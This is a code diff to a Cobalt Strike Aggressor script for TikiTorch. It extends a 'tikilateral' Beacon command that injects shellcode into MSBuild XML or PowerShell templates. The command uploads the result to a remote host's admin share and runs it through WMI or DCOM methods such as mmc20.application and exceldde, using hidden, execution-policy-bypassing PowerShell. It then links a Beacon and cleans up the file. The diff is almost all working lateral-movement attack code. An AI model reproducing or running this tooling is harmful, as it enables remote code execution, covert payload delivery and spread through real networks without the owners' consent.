@@ -1,13 +1,42 @@
+global('$WMI::AssemblyPath');
 global('$CsExec::AssemblyPath');
+global('$CsDCOM::AssemblyPath');
+global('$TikiSpawn::DllPath');
+global('$TikiSpawn::XmlPath');
 global('$TikiService::AssemblyPath');
 global('$TikiService::ConfigPath');
 
+$CsWMI::AssemblyPath = "D:\\Tools\\MiscTools\\CsWMI\\bin\\Release\\CsWMI.exe";
 $CsExec::AssemblyPath = "D:\\Tools\\MiscTools\\CsExec\\bin\\Release\\CsExec.exe";
+$CsDCOM::AssemblyPath = "D:\\Tools\\MiscTools\\CsDCOM\\bin\\Release\\CsDCOM.exe";
+$TikiSpawn::DllPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.dll";
+$TikiSpawn::XmlPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.xml";
+$TikiSpawn::PshPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.ps1";
 $TikiService::AssemblyPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe";
 $TikiService::ConfigPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe.config";
 
+if(!-exists $CsWMI::AssemblyPath) {
+    show_error("WMI assembly not found!");
+    exit();
+}
+
 if(!-exists $CsExec::AssemblyPath) {
     show_error("CsExec assembly not found!");
+    exit();
+}
+
+if(!-exists $TikiSpawn::DllPath) {
+    show_error("TikiSpawn DLL not found!");
+    exit();
+}
+
+if(!-exists $TikiSpawn::XmlPath) {
+    show_error("XML template not found!");
+    exit();
+}
+
+if(!-exists $TikiSpawn::PshPath) {
+    show_error("PowerShell template not found!");
     exit();
 }
 
@@ -32,23 +61,32 @@ alias tikilateral {
 	## Check args[] length ##
 	#########################
 
-	if (size(@args) eq "4") {
+	if (size(@args) eq "6") {
 
 		$target = @args[0];
 		$listener = @args[1];
 		$arch = @args[2];
 		$binary = @args[3];
-
+		$payload = @args[4];
+		$method = @args[5];
 	}
 
-	println("[DEBUG] target: " . $target);
-	println("[DEBUG] listener: " . $listener);
-	println("[DEBUG] arch: " . $arch);
-	println("[DEBUG] binary: " . $binary);
+	################
+	## Get Method ##
+	################
+
+	@method = split(':', $method);
+	$m0 = @method[0];
+	$m1 = @method[1];
 
 	############
 	## Errors ##
 	############
+
+	if (size(@args) ne "6") {
+		berror($bid, "Invalid number of arguments");
+		return;
+	}
 
 	if (listener_info($listener, "payload") eq "") {
 		berror($bid, "Invalid listener");
@@ -60,7 +98,12 @@ alias tikilateral {
 		return;
 	}
 
-	btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " on " . $target . " using " . $method);
+	if (($m0 ne "wmi") && ($m0 ne "dcom")) {
+		berror($bid, "Invalid method");
+		return;
+	}
+
+	btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " on " . $target . " using " . $payload . " with " . $method);
 
 	###############
 	## Shellcode ##
@@ -74,87 +117,47 @@ alias tikilateral {
 	## Prep Payload ##
 	##################
 
-	$dllPath = getFileProper(script_resource("Templates"), "TikiSpawn.dll");
-
-	$template = getFileProper(script_resource("Templates"), "TikiSpawn.xml");
-	println("[DEBUG] dll: " . $dllPath);
-	println("[DEBUG] template: " . $template);
-	
-	$final = tikilateral_data_swap($binary, $shellcode, $dllPath, $template);
-
-	##################
-	## Gen Filename ##
-	##################
-
-	@characters = @("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9");
-
-	$filename = "";
-
-	for ($i = 0; $i < 9; $i++) {
-		$filename = $filename . rand(@characters);
-	}
-
-	$filename = $filename . ".xml";
-
-	println("[DEBUG] filename: " . $filename);
+	if ($payload eq "msbuild") { $final = msbuild_data_swap($binary, $shellcode, $TikiSpawn::DllPath, $TikiSpawn::XmlPath); }
+	else if ($payload eq "powershell") { $final = powershell_data_swap($binary, $shellcode, $TikiSpawn::DllPath, $TikiSpawn::PshPath); }
 
 	####################
 	## Upload and Run ##
 	####################
 
-	bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\ $+ $filename $+ ", $final);
+	if ($payload eq "msbuild") {
 
-	if ($arch eq "x64") {
-		$buildPath = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe";
-	} else if ($arch eq "x86") {
-		$buildPath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe";
+		bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.xml", $final);
+
+		if ($arch eq "x64") { $buildPath = "%windir%\\microsoft.net\\framework64\\v4.0.30319\\msbuild.exe"; }
+		else if ($arch eq "x86") { $buildPath = "%windir%\\microsoft.net\\framework\\v4.0.30319\\msbuild.exe"; }
+
+		if ($m0 eq "wmi") { bexecute_assembly!($bid, $CsWMI::AssemblyPath, " $+ $target $+  \" $+ $buildPath $+  c:\\windows\\temp\\tikispawn.xml\"  $+ $m1 $+ "); }
+		else if ($m0 eq "dcom") { bexecute_assembly!($bid, $CsDCOM::AssemblyPath, " $+ $target $+   $+ $buildPath $+  c:\\windows\\temp\\tikispawn.xml  $+ $m1 $+ "); }
+
+	} else if ($payload eq "powershell") {
+
+		bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.ps1", $final);
+
+		$pshPath = "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe";
+
+		if ($m0 eq "wmi") { bexecute_assembly!($bid, $CsWMI::AssemblyPath, " $+ $target $+  \" $+ $pshPath $+  -nop -w hidden -ep bypass -file  c:\\windows\\temp\\tikispawn.ps1\"  $+ $m1 $+ "); }
+		else if ($m0 eq "dcom") { bexecute_assembly!($bid, $CsDCOM::AssemblyPath, " $+ $target $+   $+ $pshPath $+  \"-nop -w hidden -ep bypass -file c:\\windows\\temp\\tikispawn.ps1\"  $+ $m1 $+ "); }
+
 	}
 
-	$cmd = "wmic /node:\" $+ $target $+ \" process call create \" $+ $buildPath  $+ C:\\Windows\\Temp\\ $+ $filename $+ \"";
-	println("[DEBUG] cmd: " . $cmd);
-
-	brun!($bid, $cmd);
-	bpause!($bid, 3000);
+	bpause!($bid, 1000);
 	blink!($bid, $target);
 
 	#################
 	## Remove File ##
 	#################
 
-	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\ $+ $filename $+ ");
-
-}
-
-sub tikilateral_data_swap {
-	
-	$binary = $1;
-	$shellcode = $2;
-	$dllPath = $3;
-	$template = $4;
-
-	$handle = openf($dllPath);
-	$dll = base64_encode(readb($handle, -1));
-
-	if (-canread $template) {
-
-		$handle = openf($template);
-		@data = readAll($handle);
-		closef($handle);
-		remove(@data, @data[21]);
-		add(@data, "            public const string binary = @\" $+ $binary $+ \"\;", 21);
-		remove(@data, @data[22]);
-		add(@data, "            public const string shellcode = @\" $+ $shellcode $+ \"\;", 22);
-		remove(@data, @data[23]);
-		add(@data, "            public const string dll = @\" $+ $dll $+ \"\;", 23);
-
-		$data = "";
-
-		for ($i = 0; $i < size(@data); $i++) {
-			$data = $data . @data[$i] . "\r\n";
-		}
+	if ($payload eq "msbuild") {
+		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.xml");
+	} else if ($payload eq "powershell") {
+		#brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.ps1");
 	}
 
-	return $data;
 }
 
 alias tikiexec {
@@ -231,6 +234,70 @@ alias tikiexec {
 	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe.config");
 }
 
+sub msbuild_data_swap {
+	
+	$binary = $1;
+	$shellcode = $2;
+	$dllPath = $3;
+	$template = $4;
+
+	$handle = openf($dllPath);
+	$dll = base64_encode(readb($handle, -1));
+
+	if (-canread $template) {
+
+		$handle = openf($template);
+		@data = readAll($handle);
+		closef($handle);
+		remove(@data, @data[21]);
+		add(@data, "            public const string binary = @\" $+ $binary $+ \"\;", 21);
+		remove(@data, @data[22]);
+		add(@data, "            public const string shellcode = @\" $+ $shellcode $+ \"\;", 22);
+		remove(@data, @data[23]);
+		add(@data, "            public const string dll = @\" $+ $dll $+ \"\;", 23);
+
+		$data = "";
+
+		for ($i = 0; $i < size(@data); $i++) {
+			$data = $data . @data[$i] . "\r\n";
+		}
+	}
+
+	return $data;
+}
+
+sub powershell_data_swap {
+	
+	$binary = $1;
+	$shellcode = $2;
+	$dllPath = $3;
+	$template = $4;
+
+	$handle = openf($dllPath);
+	$dll = base64_encode(readb($handle, -1));
+
+	if (-canread $template) {
+
+		$handle = openf($template);
+		@data = readAll($handle);
+		closef($handle);
+		remove(@data, @data[0]);
+		add(@data, "\$binary = \"$binary\"", 0);
+		remove(@data, @data[1]);
+		add(@data, "\$dll = \"$dll\"", 1);
+		remove(@data, @data[2]);
+		add(@data, "\$shellcode = \"$shellcode\"", 2);
+
+		$data = "";
+
+		for ($i = 0; $i < size(@data); $i++) {
+			$data = $data . @data[$i] . "\r\n";
+		}
+	}
+
+	return $data;
+}
+
 sub tikiexec_data_swap {
 	
 	$binary = $1;
@@ -260,10 +327,19 @@ sub tikiexec_data_swap {
 beacon_command_register (
 
 	"tikilateral",
-	"Use WMI to run a TikiTorch payload on a host",
-	"Copy an XML TikiTorch payload to the remote target\n" .
-	"and execute it using MSBuild via WMI.\n\n" .
-	"Use: tikilateral [target] [listener] [x64|x86] [binary]"
+	"Execute a TikiTorch payload on a host",
+	"Execute a TikiTorch payload on the remote target using\n" .
+	"the specified payload type and code execution method.\n\n" .
+	"Use: tikilateral [target] [listener] [x64|x86] [binary] [payload] [method]\n\n" .
+	"     Payloads: powershell\n" .
+	"               msbuild\n\n" .
+	"     Methods: wmi:processcallcreate\n" .
+	"              dcom:mmc20.application\n" .
+	"              dcom:shellwindows\n" .
+	"              dcom:shellbrowserwindow\n" .
+	"              dcom:exceldde\n\n" .
+	"Example: tikilateral dc1 smb x64 c:\\windows\\system32\\svchost.exe msbuild dcom:mmc20.application\n" .
+	"Example: tikilateral dc1 smb x64 c:\\windows\\notepad.exe powershell wmi:processcallcreate"
 );
 
 beacon_command_register (
